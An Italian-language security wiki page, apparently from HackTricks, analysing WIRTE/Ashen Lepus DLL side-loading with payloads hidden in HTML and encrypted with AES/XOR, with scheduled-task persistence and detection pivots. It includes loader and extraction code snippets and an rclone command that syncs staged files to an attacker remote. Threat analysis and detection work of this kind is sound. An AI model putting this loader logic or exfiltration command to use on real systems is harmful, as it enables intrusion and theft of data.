# Advanced DLL Side-Loading con Staging di Payload incorporati in HTML

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica del tradecraft

Ashen Lepus (aka WIRTE) ha weaponized un pattern ripetibile che combina DLL sideloading, payload HTML staged e backdoor .NET modulari per mantenere la persistenza nelle reti diplomatiche mediorientali. La tecnica è riutilizzabile da qualsiasi operatore perché si basa su:<sup>[[1]](#references)</sup>

- **Social engineering basata su archivi**: PDF innocui istruiscono i target a scaricare un archivio RAR da un file-sharing site. L'archivio contiene un EXE document viewer dall'aspetto legittimo, una DLL malevola con il nome di una libreria trusted (ad esempio `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) e un file esca `Document.pdf`.
- **Abuso dell'ordine di ricerca delle DLL**: la vittima fa doppio clic sull'EXE, Windows risolve l'import della DLL dalla directory corrente e il loader malevolo (AshenLoader) viene eseguito all'interno del processo trusted, mentre il PDF esca si apre per evitare sospetti.
- **Staging living-off-the-land**: ogni fase successiva (AshenStager → AshenOrchestrator → moduli) rimane fuori dal disco fino a quando è necessaria, ed è fornita come blob cifrati nascosti all'interno di risposte HTML apparentemente innocue.

## Catena di Side-Loading multi-stage

1. **EXE esca → AshenLoader**: l'EXE esegue il side-load di AshenLoader, che effettua la ricognizione dell'host, lo cifra con AES-CTR e lo invia tramite POST all'interno di parametri rotanti come `token=`, `id=`, `q=` o `auth=` verso percorsi dall'aspetto API (ad esempio `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Estrazione HTML**: il C2 rivela la fase successiva solo quando l'IP client viene geolocalizzato nella regione target e `User-Agent` corrisponde all'implant, ostacolando le sandbox. Quando i controlli hanno esito positivo, il body HTTP contiene un blob `<headerp>...</headerp>` con il payload AshenStager cifrato con Base64/AES-CTR.
3. **Secondo sideload**: AshenStager viene distribuito con un altro binary legittimo che importa `wtsapi32.dll`. La copia malevola iniettata nel binary recupera altro HTML, questa volta estraendo `<article>...</article>` per recuperare AshenOrchestrator.
4. **AshenOrchestrator**: un controller .NET modulare che decodifica una config JSON Base64. I campi `tg` e `au` della config vengono concatenati e sottoposti a hashing per ottenere la chiave AES, che decritta `xrk`. I byte risultanti fungono da chiave XOR per ogni blob di modulo recuperato in seguito.
5. **Distribuzione dei moduli**: ogni modulo viene descritto tramite commenti HTML che reindirizzano il parser verso un tag arbitrario, aggirando le regole statiche che cercano solo `<headerp>` o `<article>`. I moduli includono persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) e file exploration (`FE`).

### Pattern di Parsing dei Container HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Anche se i difensori bloccano o rimuovono un elemento specifico, all'operatore basta modificare il tag indicato nel commento HTML per riprendere la delivery.<sup>[[1]](#references)</sup>

### Helper rapido per l'estrazione (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Parallelismi dell'evasione tramite HTML Staging

Le ricerche recenti sull'HTML smuggling (Talos) evidenziano payload nascosti come stringhe Base64 all'interno di blocchi `<script>` negli allegati HTML e decodificati tramite JavaScript a runtime.<sup>[[2]](#references)</sup> Lo stesso trucco può essere riutilizzato per le risposte C2: si possono inserire blob cifrati all'interno di un tag script (o di un altro elemento DOM) e decodificarli in memoria prima di applicare AES/XOR, facendo apparire la pagina come normale HTML. Talos mostra inoltre un'obfuscation a più livelli (rinomina degli identificatori più Base64/Caesar/AES) all'interno dei tag script, una tecnica facilmente applicabile ai blob C2 sottoposti a HTML staging.<sup>[[2]](#references)</sup> Un'analisi Talos successiva sul **hidden text salting** è anch'essa rilevante: suddividere Base64 con commenti HTML irrilevanti o spazi bianchi è sufficiente per aggirare semplici extractor basati su regex, mantenendo al contempo banale la ricostruzione lato browser.<sup>[[7]](#references)</sup>

## Note sulle varianti recenti (2024-2025)

- Check Point ha osservato campagne WIRTE nel 2024 che si basavano ancora sul sideloading tramite archivi, ma utilizzavano `propsys.dll` (stagerx64) come primo stage. Lo stager decodifica il payload successivo con Base64 + XOR (chiave `53`), invia richieste HTTP con uno `User-Agent` hardcoded ed estrae blob cifrati incorporati tra tag HTML. In un ramo, lo stage veniva ricostruito a partire da un lungo elenco di stringhe IP incorporate, decodificate tramite `RtlIpv4StringToAddressA` e quindi concatenate nei byte del payload.<sup>[[3]](#references)</sup>
- OWN-CERT ha documentato tool WIRTE precedenti in cui il dropper `wtsapi32.dll` caricato tramite sideloading proteggeva le stringhe con Base64 + TEA e utilizzava il nome della DLL stessa come chiave di decryption; successivamente offuscava tramite XOR/Base64 i dati di identificazione dell'host prima di inviarli al C2.<sup>[[4]](#references)</sup>

## Ricostruzione degli stage codificati tramite IP

Il ramo `propsys.dll` di WIRTE del 2024 mostra che il PE successivo non deve necessariamente trovarsi all'interno di un singolo blob HTML contiguo. Il loader può archiviare i byte dello stage come stringhe dotted-quad e ricostruirli con `RtlIpv4StringToAddressA`, secondo un pattern strettamente correlato al tradecraft **IPfuscation** di Hive.<sup>[[3]](#references)[[5]](#references)</sup> Dal punto di vista operativo, questa tecnica è utile quando l'attore vuole che la pagina HTML contenga quelli che sembrano IOC o dati di configurazione innocui, anziché un evidente payload Base64.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Se i byte recuperati iniziano con `MZ`, probabilmente hai ricostruito direttamente il PE successivo. In caso contrario, verifica la presenza di un layer iniziale XOR/Base64 o di piccoli chunk delimitatori tra gli indirizzi.

## Nomi DLL intercambiabili e rotazione degli host

Una proprietà importante di questo pattern è che il **backend di staging HTML/AES/XOR può rimanere identico mentre cambia solo la coppia utilizzata per il sideload**. WIRTE ha alternato `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` e `propsys.dll` nelle varie campagne, il che è utile perché:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` e `wtsapi32.dll` sono nomi di DLL Windows comuni che i defender si aspettano di trovare in `%System32%` / `%SysWOW64%`.
- Cataloghi pubblici come **HijackLibs** mappano già molti binari che caricheranno quei nomi di DLL dalla directory di un'applicazione copiata, fornendo agli operatori host sostitutivi senza dover riprogettare lo stager.
- È necessario adattare solo la superficie degli export per ciascun host. Il parser HTML, le routine AES/XOR e il module loader possono solitamente essere trapiantati senza modifiche in una DLL proxy di forwarding.

Per il lavoro in offensive lab, ciò significa che puoi separare il problema in **(1) trovare un host firmato stabile che risolva localmente il nome DLL scelto** e **(2) riutilizzare la stessa logica del loader HTML staged dietro quella DLL**.

## Hardening di Crypto e C2

- **AES-CTR ovunque**: gli attuali loader incorporano chiavi a 256 bit più nonce (ad esempio `{9a 20 51 98 ...}`) e aggiungono facoltativamente un layer XOR utilizzando stringhe come `msasn1.dll` prima o dopo la decrittazione.<sup>[[1]](#references)</sup>
- **Variazioni del key material**: i loader precedenti utilizzavano Base64 + TEA per proteggere le stringhe incorporate, con la chiave di decrittazione derivata dal nome della DLL malevola (ad esempio `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Suddivisione dell'infrastruttura + camouflage dei subdomain**: i server di staging sono separati per tool, ospitati su ASN differenti e talvolta preceduti da subdomain dall'aspetto legittimo, così la compromissione di uno stage non espone il resto.
- **Recon smuggling**: i dati enumerati ora includono gli elenchi di Program Files per individuare applicazioni di alto valore e sono sempre cifrati prima di lasciare l'host.
- **Rotazione degli URI**: i parametri di query e i percorsi REST cambiano tra le campagne (`/api/v1/account?token=` → `/api/v2/account?auth=`), rendendo inefficaci le detection fragili.
- **User-Agent pinning + safe redirects**: l'infrastruttura C2 risponde solo a stringhe UA esatte e, in caso contrario, reindirizza verso siti benigni di notizie/salute per confondersi con il traffico normale.
- **Gated delivery**: i server sono geo-fenced e rispondono solo agli implant reali. I client non approvati ricevono HTML non sospetto.

## Persistence e execution loop

AshenStager crea scheduled task che si spacciano per job di manutenzione Windows ed eseguono tramite `svchost.exe`, ad esempio:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Questi task rilanciano la catena di sideload all'avvio o a intervalli regolari, assicurando che AshenOrchestrator possa richiedere nuovi moduli senza dover nuovamente scrivere sul disco.

## Utilizzo di client di sincronizzazione benigni per l'exfiltration

Gli operatori preparano i documenti diplomatici all'interno di `C:\Users\Public` (leggibile da tutti e non sospetto) tramite un modulo dedicato, quindi scaricano il binario legittimo [Rclone](https://rclone.org/) per sincronizzare quella directory con lo storage dell'attaccante. Unit42 osserva che questa è la prima volta in cui questo actor è stato osservato utilizzare Rclone per l'exfiltration, in linea con la tendenza più ampia ad abusare di strumenti di sincronizzazione legittimi per confondersi con il traffico normale:<sup>[[1]](#references)</sup>

1. **Stage**: copia/raccogli i file target in `C:\Users\Public\{campaign}\`.
2. **Configure**: distribuisci una configurazione Rclone che punti a un endpoint HTTPS controllato dall'attaccante (ad esempio `api.technology-system[.]com`).
3. **Sync**: esegui `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` in modo che il traffico assomigli ai normali backup cloud.

Poiché Rclone è ampiamente utilizzato per workflow di backup legittimi, i defender devono concentrarsi sulle esecuzioni anomale (nuovi binari, remoti insoliti o sincronizzazioni improvvise di `C:\Users\Public`).

## Detection pivots

- Genera un alert per i **processi firmati** che caricano inaspettatamente DLL da percorsi scrivibili dagli utenti (filtri Procmon + `Get-ProcessMitigation -Module`), soprattutto quando i nomi delle DLL coincidono con `netutils`, `srvcli`, `dwampi`, `wtsapi32` o `propsys`.<sup>[[6]](#references)</sup>
- Analizza le risposte HTTPS sospette alla ricerca di **grandi blob Base64 incorporati in tag insoliti** o protetti da commenti `<!-- TAG: <xyz> -->`.
- Normalizza prima l'HTML: **rimuovi i commenti e comprimi gli spazi bianchi prima dell'estrazione Base64**, poiché l'evasione in stile hidden-text-salting può suddividere i payload tra i confini dei commenti.
- Estendi la ricerca nell'HTML alle **stringhe Base64 all'interno dei blocchi `<script>`** (staging in stile HTML smuggling) che vengono decodificate tramite JavaScript prima dell'elaborazione AES/XOR.
- Cerca chiamate ripetute a **`RtlIpv4StringToAddressA` seguite dall'assemblaggio di buffer**, soprattutto quando le stringhe circostanti sono lunghi elenchi di IPv4 anziché target di rete reali.
- Cerca **scheduled task** che eseguono `svchost.exe` con argomenti non relativi a servizi o che puntano alle directory dei dropper.
- Monitora i **redirect C2** che restituiscono payload solo per stringhe `User-Agent` esatte e che altrimenti rimandano a domini legittimi di notizie/salute.
- Monitora la presenza di binari **Rclone** al di fuori dei percorsi gestiti dall'IT, nuovi file `rclone.conf` o job di sincronizzazione che prelevano dati da directory di staging come `C:\Users\Public`.

## References

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
